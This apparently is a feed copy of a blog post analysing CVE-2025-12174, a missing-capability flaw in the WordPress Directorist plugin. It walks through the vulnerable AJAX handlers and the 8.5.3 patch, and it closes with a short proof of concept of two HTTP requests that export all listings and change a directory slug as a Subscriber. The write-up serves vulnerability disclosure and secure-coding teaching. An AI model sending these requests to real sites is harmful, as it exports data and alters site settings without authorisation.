      <pubDate>Sat, 13 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-13-cve-2025-12174/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-13-cve-2025-12174/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Directorist: AI-Powered Business Directory Plugin with Classified Ads Listings&lt;/strong&gt; plugin for WordPress contains an unauthorized access vulnerability due to missing permission validation for the AJAX actions &lt;code&gt;directorist_prepare_listings_export_file&lt;/code&gt; and &lt;code&gt;directorist_type_slug_change&lt;/code&gt; in all versions up to &lt;strong&gt;8.5.2&lt;/strong&gt;. This allows an authenticated attacker with &lt;strong&gt;Subscriber or higher&lt;/strong&gt; privileges to export listing data and change the directorist slug.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-12174&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-12174&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 8.5.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 8.5.3&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (6.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subcriber&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/directorist/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Directorist Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Directorist&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;8.5.2&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;8.5.3&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers two action hooks:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_directorist_prepare_listings_export_file&amp;#39;, [ $this, &amp;#39;handle_prepare_listings_export_file_request&amp;#39; ] );&#xA;add_action( &amp;#39;wp_ajax_directorist_type_slug_change&amp;#39;, [ $this, &amp;#39;directorist_type_slug_change&amp;#39; ] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;wp_ajax_&lt;/code&gt; hooks are only for logged-in users (from Subscriber upward). These actions call their respective handler functions.&lt;/p&gt;&#xA;&lt;p&gt;handler functions.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;1. &lt;code&gt;wp_ajax_directorist_prepare_listings_export_file&lt;/code&gt;:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_prepare_listings_export_file_request() {&#xA;    if ( ! directorist_verify_nonce() ) {&#xA;        $data[&amp;#39;success&amp;#39;] = false;&#xA;        $data[&amp;#39;message&amp;#39;] = __( &amp;#39;Something is wrong! Please refresh and retry.&amp;#39;, &amp;#39;directorist&amp;#39; );&#xA;&#xA;        return wp_send_json( $data );&#xA;    }&#xA;&#xA;    $file = Directorist\Listings_Exporter::get_prepared_listings_export_file();&#xA;&#xA;    wp_send_json( $file );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function returns all &lt;strong&gt;Directory Listings&lt;/strong&gt; in a &lt;code&gt;.csv&lt;/code&gt; file generated by &lt;code&gt;get_prepared_listings_export_file()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function get_prepared_listings_export_file() {&#xA;    $filename      = &amp;#34;listings-export-data&amp;#34;;&#xA;    $file_name     = &amp;#34;{$filename}.csv&amp;#34;;&#xA;    $file_contents = self::get_listings_data_as_csv_content();&#xA;&#xA;    $old_file_id = get_directorist_option( &amp;#39;directorist_export_attachent_id&amp;#39;, &amp;#39;&amp;#39;, true );&#xA;    if ( ! empty( $old_file_id ) ) {&#xA;        wp_delete_attachment( $old_file_id, true );&#xA;    }&#xA;&#xA;    $upload_dir = wp_upload_dir();&#xA;&#xA;    if ( wp_mkdir_p( $upload_dir[&amp;#39;path&amp;#39;] ) ) {&#xA;        $file = $upload_dir[&amp;#39;path&amp;#39;] . &amp;#39;/&amp;#39; . $file_name;&#xA;    } else {&#xA;        $file = $upload_dir[&amp;#39;basedir&amp;#39;] . &amp;#39;/&amp;#39; . $file_name;&#xA;    }&#xA;&#xA;    file_put_contents( $file, $file_contents );&#xA;&#xA;    $wp_filetype = wp_check_filetype( $file_name, null );&#xA;    $attachment = [&#xA;        &amp;#39;post_mime_type&amp;#39; =&amp;gt; $wp_filetype[&amp;#39;type&amp;#39;],&#xA;        &amp;#39;post_title&amp;#39;     =&amp;gt; sanitize_file_name( $filename ),&#xA;        &amp;#39;post_content&amp;#39;   =&amp;gt; &amp;#39;&amp;#39;,&#xA;        &amp;#39;post_status&amp;#39;    =&amp;gt; &amp;#39;inherit&amp;#39;&#xA;    ];&#xA;&#xA;    $attach_id = wp_insert_attachment( $attachment, $file );&#xA;    $attach_url = wp_get_attachment_url( $attach_id );&#xA;&#xA;    update_directorist_option( &amp;#39;directorist_export_attachent_id&amp;#39;, $attach_id );&#xA;&#xA;    return [ &amp;#39;success&amp;#39; =&amp;gt; true, &amp;#39;file_url&amp;#39; =&amp;gt; $attach_url ];&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The returned path is the &lt;strong&gt;&lt;code&gt;file_url&lt;/code&gt;&lt;/strong&gt; value in the resulting array:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;return [ &amp;#39;success&amp;#39; =&amp;gt; true, &amp;#39;file_url&amp;#39; =&amp;gt; $attach_url ];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Specifically:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;The CSV file is created in the WordPress uploads directory, e.g.:&lt;br&gt;&#xA;&lt;strong&gt;&lt;code&gt;wp-content/uploads/2025/01/listings-export-data.csv&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Then the file is registered as an &lt;strong&gt;attachment&lt;/strong&gt;, and WordPress generates a &lt;strong&gt;public access URL&lt;/strong&gt;, which is returned via &lt;code&gt;file_url&lt;/code&gt;, e.g.:&lt;br&gt;&#xA;&lt;strong&gt;&lt;code&gt;https://example.com/wp-content/uploads/2025/01/listings-export-data.csv&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;br&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Directory Listings can be found at:&lt;br&gt;&#xA;&lt;code&gt;http://localhost/wp-admin/edit.php?post_type=at_biz_dir&lt;/code&gt;&lt;br&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-13-cve-2025-12174/listing.png&#34; title=&#34;Danh sách các Directory Listings&#34; data-thumbnail=&#34;/posts/2025-12-13-cve-2025-12174/listing.png&#34; data-sub-html=&#34;&lt;h2&gt;Listing&lt;/h2&gt;&lt;p&gt;Danh sách các Directory Listings&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-13-cve-2025-12174/listing.png&#39; alt=&#34;Listing&#34; height=&#34;919&#34; width=&#34;1841&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Danh sách các Directory Listings&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;2. &lt;code&gt;wp_ajax_directorist_type_slug_change&lt;/code&gt;:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function directorist_type_slug_change() {&#xA;    if ( ! directorist_verify_nonce() ) {&#xA;        wp_send_json(&#xA;            [&#xA;                &amp;#39;error&amp;#39; =&amp;gt; __( &amp;#39;Session expired, please reload the window and try again.&amp;#39;, &amp;#39;directorist&amp;#39; ),&#xA;            ]&#xA;        );&#xA;    }&#xA;&#xA;    $type_id     = isset( $_POST[&amp;#39;type_id&amp;#39;] ) ? sanitize_key( $_POST[&amp;#39;type_id&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $update_slug = isset( $_POST[&amp;#39;update_slug&amp;#39;] ) ? sanitize_key( $_POST[&amp;#39;update_slug&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;&#xA;    $directory_slugs = [];&#xA;    $listing_types   = directorist_get_directories();&#xA;&#xA;    if ( $listing_types ) {&#xA;        foreach ( $listing_types as $listing_type ) {&#xA;            $directory_slugs[] = $listing_type-&amp;gt;slug;&#xA;            if ( $type_id == $listing_type-&amp;gt;term_id ) {&#xA;                $old_slug = $listing_type-&amp;gt;slug;&#xA;            }&#xA;        }&#xA;    }&#xA;&#xA;    if ( in_array( $update_slug, $directory_slugs ) ) {&#xA;        wp_send_json(&#xA;            [&#xA;                &amp;#39;error&amp;#39;    =&amp;gt; __( &amp;#39;This slug already in use.&amp;#39;, &amp;#39;directorist&amp;#39; ),&#xA;                &amp;#39;old_slug&amp;#39; =&amp;gt; ! empty( $old_slug ) ? $old_slug : &amp;#39;&amp;#39;,&#xA;            ]&#xA;        );&#xA;    } else {&#xA;        $update_type_slug = wp_update_term( $type_id, ATBDP_TYPE, [ &amp;#39;slug&amp;#39; =&amp;gt; $update_slug ] );&#xA;        if ( $update_type_slug ) {&#xA;            wp_send_json(&#xA;                [&#xA;                    &amp;#39;success&amp;#39; =&amp;gt; __( &amp;#39;Slug changes successfully.&amp;#39;, &amp;#39;directorist&amp;#39; ),&#xA;                ]&#xA;            );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function allows changing the slug of any Listing Type with &lt;code&gt;type_id&lt;/code&gt; and &lt;code&gt;update_slug&lt;/code&gt; obtained from the POST request.&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;Notice that both callbacks call &lt;code&gt;directorist_verify_nonce&lt;/code&gt; to enforce CSRF protection using the default action &lt;code&gt;directorist_nonce&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function directorist_verify_nonce( $nonce_field = &amp;#39;directorist_nonce&amp;#39;, $action = &amp;#39;&amp;#39; ) {&#xA;    $nonce = ! empty( $_REQUEST[ $nonce_field ] ) ? directorist_clean( wp_unslash( $_REQUEST[ $nonce_field ] ) ) : &amp;#39;&amp;#39;;&#xA;    return wp_verify_nonce( $nonce, ( $action ? $action : directorist_get_nonce_key() ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;directorist_nonce&lt;/code&gt; is always available for logged-in users.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;br&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;strong&gt;The vulnerability arises due to missing any capability/permission check.&lt;/strong&gt;&lt;br&gt;&#xA;Any authenticated user (Subscriber or higher) can call the endpoint to obtain all &lt;strong&gt;Directory Listings&lt;/strong&gt; or modify the slug of any Listing Type, even though these actions should be restricted to admins.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;The patch (v8.5.3)&lt;/strong&gt; adds a capability check to the callbacks:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! current_user_can( &amp;#39;manage_atbdp_options&amp;#39; ) ) {&#xA;    wp_send_json_error(&#xA;        [&#xA;            &amp;#39;error&amp;#39; =&amp;gt; __( &amp;#39;You are not allowed to modify directory slugs.&amp;#39;, &amp;#39;directorist&amp;#39; ),&#xA;        ],&#xA;        403&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;manage_atbdp_options&lt;/code&gt; permission is a &lt;strong&gt;custom capability&lt;/strong&gt;, assigned to Administrator via:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$wp_roles-&amp;gt;add_cap( &amp;#39;administrator&amp;#39;, &amp;#39;manage_atbdp_options&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Meaning only Administrators may perform actions such as slug changes or data export, completely fixing the missing capability validation.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Logged-in user (Subscriber or higher)&amp;#34;] --&amp;gt; B[&amp;#34;Send AJAX request to wp-admin/admin-ajax.php with action=directorist_prepare_listings_export_file or action=directorist_type_slug_change&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;wp_ajax_* hook is triggered&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Callback executes&amp;#34;]&#xA;D --&amp;gt; E{&amp;#34;Is nonce valid?&amp;#34;}&#xA;E -- No --&amp;gt; F[&amp;#34;Return error&amp;#34;]&#xA;E -- Yes --&amp;gt; G[&amp;#34;Process request&amp;#34;]&#xA;G --&amp;gt; H{&amp;#34;Is capability checked?&amp;#34;}&#xA;H -- No --&amp;gt; I[&amp;#34;Subscriber or higher can export all listings or change any directory slug&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;Broken Access Control&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Login with a Subscriber account and obtain the &lt;code&gt;directorist_nonce&lt;/code&gt; from the response&lt;br&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-13-cve-2025-12174/nonce.png&#34; title=&#34;Lấy nonce từ response&#34; data-thumbnail=&#34;/posts/2025-12-13-cve-2025-12174/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce&lt;/h2&gt;&lt;p&gt;Lấy nonce từ response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-13-cve-2025-12174/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;670&#34; width=&#34;927&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Lấy nonce từ response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Send request:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Retrieve &lt;strong&gt;Directory Listings&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost &#xA;Cookie: sub_cookie&#xA;...&#xA;action=directorist_prepare_listings_export_file&amp;amp;directorist_nonce=22a1e53ab7&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Change the slug of any Listing Type&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost &#xA;Cookie: sub_cookie&#xA;...&#xA;action=directorist_type_slug_change&amp;amp;directorist_nonce=22a1e53ab7&amp;amp;type_id=580&amp;amp;update_slug=payload&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability in &lt;strong&gt;Directorist &amp;lt;= 8.5.2&lt;/strong&gt; arises from the &lt;strong&gt;lack of authorization checks&lt;/strong&gt; on two privileged AJAX actions. Although the plugin uses nonces to defend against CSRF, this does not act as a permission check, resulting in &lt;strong&gt;any authenticated user&lt;/strong&gt;, including &lt;em&gt;Subscriber&lt;/em&gt;, being able to export complete listing data or arbitrarily change slugs — actions intended only for Administrators.&lt;br&gt;&#xA;The patch in &lt;strong&gt;v8.5.3&lt;/strong&gt; completely fixes the issue by adding a &lt;code&gt;manage_atbdp_options&lt;/code&gt; capability check, restoring proper authorization boundaries.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Nonce is not a permission check&lt;/strong&gt;: nonce only prevents CSRF, not unauthorized low-privileged actions.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;WordPress AJAX is a common attack surface&lt;/strong&gt;: every &lt;code&gt;wp_ajax_&lt;/code&gt; must implement explicit capability checks.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Broken Access Control often arises from a missing single line&lt;/strong&gt;, not complex logic.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Custom capability&lt;/strong&gt; (like &lt;code&gt;manage_atbdp_options&lt;/code&gt;) is effective for fine-grained permission control.&lt;/li&gt;&#xA;&lt;li&gt;Always validate both &lt;strong&gt;user authentication&lt;/strong&gt; and &lt;strong&gt;permissions&lt;/strong&gt; before allowing administrative actions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; 